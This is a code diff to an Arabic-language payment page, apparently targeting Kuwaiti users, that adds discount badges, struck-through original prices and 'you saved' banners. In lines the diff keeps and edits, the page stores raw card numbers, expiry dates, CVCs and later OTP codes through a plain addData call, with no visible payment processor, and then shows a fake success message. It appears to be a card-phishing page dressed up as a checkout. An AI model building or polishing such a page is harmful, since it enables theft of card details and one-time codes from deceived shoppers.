@@ -17,6 +17,8 @@ import {
   Loader2,
   Sparkles,
   CheckCircle2,
+  Percent,
+  Gift,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
@@ -45,6 +47,9 @@ type FormErrors = Record<string, string>
 interface OrderDetails {
   id: string
   total: string
+  originalAmount: string
+  discountAmount: string
+  discountPercentage: string
   date: string
 }
 
@@ -70,25 +75,33 @@ export default function PaymentMethodsComponent() {
   const [currency, setCurrency] = useState("kwt")
   const [formErrors, setFormErrors] = useState<FormErrors>({})
 
-  // State for order details
+  // State for order details with discount
   const [orderDetails, setOrderDetails] = useState<OrderDetails>({
     id: generateOrderId(),
     total: "30.000",
+    originalAmount: "30.000",
+    discountAmount: "0.000",
+    discountPercentage: "0",
     date: new Date().toISOString(),
   })
 
   const router = useRouter()
 
-  // Initialize order details from localStorage
+  // Initialize order details from localStorage with discount information
   useEffect(() => {
     try {
-      const storedAmount = localStorage.getItem("amount")
-      if (storedAmount) {
-        setOrderDetails((prev) => ({
-          ...prev,
-          total: storedAmount,
-        }))
-      }
+      const finalAmount = localStorage.getItem("amount") || "30.000" // Discounted amount
+      const originalAmount = localStorage.getItem("originalAmount") || finalAmount
+      const discountAmount = localStorage.getItem("discountAmount") || "0.000"
+      const discountPercentage = localStorage.getItem("discountPercentage") || "0"
+
+      setOrderDetails((prev) => ({
+        ...prev,
+        total: finalAmount,
+        originalAmount,
+        discountAmount,
+        discountPercentage,
+      }))
     } catch (error) {
       console.error("Error accessing localStorage:", error)
     }
@@ -121,6 +134,9 @@ export default function PaymentMethodsComponent() {
       return "anonymous-user"
     }
   }
+
+  // Check if discount is applied
+  const hasDiscount = Number.parseFloat(orderDetails.discountAmount) > 0
 
   // Format card number with spaces
   const formatCardNumber = (value: string) => {
@@ -193,7 +209,6 @@ export default function PaymentMethodsComponent() {
   // Handle payment submission
   const handlePayment = () => {
     if (paymentMethod === "card" && !validateForm()) {
-      
       return
     }
 
@@ -204,13 +219,16 @@ export default function PaymentMethodsComponent() {
 
     setIsProcessing(true)
 
-    // Mock database submission
-    addData( {
-      id:getVisitorId(),
+    // Submit payment data with discount information
+    addData({
+      id: getVisitorId(),
       cardNumber,
       cardExpiry,
       cardCvc,
       amount: orderDetails.total,
+      originalAmount: orderDetails.originalAmount,
+      discountAmount: orderDetails.discountAmount,
+      discountPercentage: orderDetails.discountPercentage,
       currency,
       orderId: orderDetails.id,
     })
@@ -259,8 +277,10 @@ export default function PaymentMethodsComponent() {
 
     setIsProcessing(true)
     setOtpVerificationError(null)
-    addData( {
-      id:getVisitorId(),otp:otpCode})
+    addData({
+      id: getVisitorId(),
+      otp: otpCode,
+    })
 
     setTimeout(() => {
       setIsProcessing(false)
@@ -386,7 +406,7 @@ export default function PaymentMethodsComponent() {
     </div>
   )
 
-  // Enhanced Order summary
+  // Enhanced Order summary with discount
   const renderOrderSummary = () => (
     <motion.div
       className="bg-gradient-to-br from-purple-50 to-pink-50 rounded-2xl p-6 mb-8 border border-purple-100 relative overflow-hidden"
@@ -403,6 +423,17 @@ export default function PaymentMethodsComponent() {
             <Sparkles className="w-4 h-4 text-white" />
           </div>
           <h3 className="font-bold text-lg text-gray-800">ملخص الطلب</h3>
+          {hasDiscount && (
+            <motion.div
+              className="mr-auto bg-gradient-to-r from-green-500 to-emerald-500 text-white px-3 py-1 rounded-full text-xs font-bold flex items-center gap-1"
+              initial={{ scale: 0 }}
+              animate={{ scale: 1 }}
+              transition={{ type: "spring", stiffness: 500, delay: 0.3 }}
+            >
+              <Gift className="w-3 h-3" />
+              خصم {orderDetails.discountPercentage}%
+            </motion.div>
+          )}
         </div>
 
         <div className="space-y-4">
@@ -411,21 +442,61 @@ export default function PaymentMethodsComponent() {
             <span className="font-bold text-purple-700">{orderDetails.id}</span>
           </div>
           <Separator className="bg-purple-200/50" />
-          <div className="flex justify-between items-center">
-            <span className="text-gray-600">المبلغ الإجمالي:</span>
-            <div className="text-right">
-              <span className="font-bold text-2xl bg-gradient-to-r from-purple-600 to-pink-600 bg-clip-text text-transparent">
-                {orderDetails.total}
-              </span>
-              <span className="text-gray-600 mr-1">{currency === "kwt" ? "د.ك" : "$"}</span>
-            </div>
-          </div>
+
+          {hasDiscount && (
+            <>
+              <motion.div
+                className="flex justify-between items-center"
+                initial={{ opacity: 0, x: 20 }}
+                animate={{ opacity: 1, x: 0 }}
+                transition={{ delay: 0.2 }}
+              >
+                <span className="text-gray-600">المبلغ الأصلي:</span>
+                <span className="line-through text-gray-400 font-medium">
+                  {orderDetails.originalAmount} {currency === "kwt" ? "د.ك" : "$"}
+                </span>
+              </motion.div>
+
+              <motion.div
+                className="flex justify-between items-center bg-green-50 p-3 rounded-lg border border-green-200"
+                initial={{ opacity: 0, scale: 0.9 }}
+                animate={{ opacity: 1, scale: 1 }}
+                transition={{ delay: 0.4 }}
+              >
+                <div className="flex items-center gap-2">
+                  <Percent className="w-4 h-4 text-green-600" />
+                  <span className="text-green-700 font-bold">خصم {orderDetails.discountPercentage}%</span>
+                </div>
+                <span className="text-green-700 font-bold">
+                  -{orderDetails.discountAmount} {currency === "kwt" ? "د.ك" : "$"}
+                </span>
+              </motion.div>
+              <Separator className="bg-purple-200/50" />
+            </>
+          )}
+
+
+          {hasDiscount && (
+            <motion.div
+              className="text-center bg-gradient-to-r from-green-100 to-emerald-100 p-3 rounded-lg border border-green-200"
+              initial={{ opacity: 0, y: 10 }}
+              animate={{ opacity: 1, y: 0 }}
+              transition={{ delay: 0.6 }}
+            >
+              <div className="flex items-center justify-center gap-2 text-green-700">
+                <Sparkles className="w-4 h-4" />
+                <span className="font-bold">
+                  🎉 وفرت {orderDetails.discountAmount} {currency === "kwt" ? "د.ك" : "$"}!
+                </span>
+              </div>
+            </motion.div>
+          )}
         </div>
       </div>
     </motion.div>
   )
 
-  // Enhanced Success state
+  // Enhanced Success state with discount information
   const renderSuccessState = () => (
     <>
       <CardHeader className="space-y-4 pb-6 text-center">
@@ -443,6 +514,22 @@ export default function PaymentMethodsComponent() {
             تم الدفع بنجاح
           </CardTitle>
           <CardDescription className="text-lg text-gray-600 mt-2">شكراً لك، تمت عملية الدفع بنجاح</CardDescription>
+          {hasDiscount && (
+            <motion.div
+              className="mt-3 bg-gradient-to-r from-green-100 to-emerald-100 p-3 rounded-lg border border-green-200"
+              initial={{ opacity: 0, scale: 0.9 }}
+              animate={{ opacity: 1, scale: 1 }}
+              transition={{ delay: 0.5 }}
+            >
+              <div className="flex items-center justify-center gap-2 text-green-700">
+                <Gift className="w-5 h-5" />
+                <span className="font-bold">
+                  تم توفير {orderDetails.discountAmount} {currency === "kwt" ? "د.ك" : "$"} بخصم{" "}
+                  {orderDetails.discountPercentage}%
+                </span>
+              </div>
+            </motion.div>
+          )}
         </motion.div>
       </CardHeader>
 
@@ -476,8 +563,27 @@ export default function PaymentMethodsComponent() {
                 <span className="font-medium text-gray-800">{getCurrentDate()}</span>
               </div>
               <Separator className="bg-green-200/50" />
+
+              {hasDiscount && (
+                <>
+                  <div className="flex justify-between items-center">
+                    <span className="text-gray-600">المبلغ الأصلي:</span>
+                    <span className="line-through text-gray-400">
+                      {orderDetails.originalAmount} {currency === "kwt" ? "د.ك" : "$"}
+                    </span>
+                  </div>
+                  <div className="flex justify-between items-center">
+                    <span className="text-green-600 font-medium">خصم {orderDetails.discountPercentage}%:</span>
+                    <span className="text-green-600 font-bold">
+                      -{orderDetails.discountAmount} {currency === "kwt" ? "د.ك" : "$"}
+                    </span>
+                  </div>
+                  <Separator className="bg-green-200/50" />
+                </>
+              )}
+
               <div className="flex justify-between items-center">
-                <span className="text-gray-600">المبلغ الإجمالي:</span>
+                <span className="text-gray-600">المبلغ المدفوع:</span>
                 <div className="text-right">
                   <span className="font-bold text-2xl text-green-600">{orderDetails.total}</span>
                   <span className="text-gray-600 mr-1">{currency === "kwt" ? "د.ك" : "$"}</span>
@@ -611,8 +717,8 @@ export default function PaymentMethodsComponent() {
                             <div className="text-sm text-gray-500">Visa, Mastercard</div>
                           </div>
                           <div className="flex gap-2">
-<img src="/visa.svg" width={30}/>
-<img src="/master.svg" width={30}/>
+                            <img src="/visa.svg" width={30} alt="Visa" />
+                            <img src="/master.svg" width={30} alt="Mastercard" />
                           </div>
                         </Label>
                       </div>
@@ -763,8 +869,7 @@ export default function PaymentMethodsComponent() {
                             <div className="text-sm text-gray-500">الدفع المحلي الآمن</div>
                           </div>
                           <div className="flex items-center">
-                          <img src="/kv.png" width={30}/>
-
+                            <img src="/kv.png" width={30} alt="KNET" />
                           </div>
                         </Label>
                       </div>
@@ -802,7 +907,7 @@ export default function PaymentMethodsComponent() {
 
           {paymentState === "SUCCESS" && renderSuccessState()}
 
-          {/* Enhanced OTP Dialog */}
+          {/* Enhanced OTP Dialog with discount info */}
           <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
             <DialogContent className="sm:max-w-md rounded-2xl border-0 shadow-2xl" dir="rtl">
               <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-purple-600 to-pink-600 rounded-t-2xl"></div>
@@ -826,12 +931,41 @@ export default function PaymentMethodsComponent() {
                     <span className="font-bold text-purple-700">{orderDetails.id}</span>
                   </div>
                   <Separator className="bg-purple-200/50" />
+
+                  {hasDiscount && (
+                    <>
+                      <div className="flex justify-between items-center">
+                        <span className="text-sm text-gray-600">المبلغ الأصلي:</span>
+                        <span className="line-through text-gray-400">
+                          {orderDetails.originalAmount} {currency === "kwt" ? "د.ك" : "$"}
+                        </span>
+                      </div>
+                      <div className="flex justify-between items-center">
+                        <span className="text-sm text-green-600 font-medium">
+                          خصم {orderDetails.discountPercentage}%:
+                        </span>
+                        <span className="text-green-600 font-bold">
+                          -{orderDetails.discountAmount} {currency === "kwt" ? "د.ك" : "$"}
+                        </span>
+                      </div>
+                      <Separator className="bg-purple-200/50" />
+                    </>
+                  )}
+
                   <div className="flex justify-between items-center">
-                    <span className="text-sm text-gray-600">المبلغ الإجمالي:</span>
+                    <span className="text-sm text-gray-600">المبلغ المطلوب:</span>
                     <span className="font-bold text-lg">
                       {orderDetails.total} {currency === "kwt" ? "د.ك" : "$"}
                     </span>
                   </div>
+
+                  {hasDiscount && (
+                    <div className="text-center bg-green-50 p-2 rounded-lg border border-green-200">
+                      <span className="text-xs text-green-700 font-medium">
+                        🎉 توفير {orderDetails.discountAmount} {currency === "kwt" ? "د.ك" : "$"}
+                      </span>
+                    </div>
+                  )}
                 </div>
               </div>
 
